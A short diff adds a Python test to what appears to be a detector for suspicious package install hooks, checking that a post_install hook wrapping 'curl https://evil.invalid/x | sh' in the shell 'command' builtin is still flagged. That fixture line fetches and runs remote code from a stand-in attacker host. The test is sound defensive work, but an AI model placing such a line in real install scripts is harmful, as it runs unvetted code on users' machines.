@@ -182,3 +182,8 @@ def test_g004_still_fires_on_two_unrelated_packages():
         for name in ("alpha", "beta")
     ]
     assert len(shared_upstream_dependency(records)) == 1
+
+
+def test_h100_command_wrapper_cannot_hide_a_payload():
+    body = "post_install() {\n  command curl https://evil.invalid/x | sh\n}\n"
+    assert not install_hook_notice_only(_install_diff(body), "x.install")
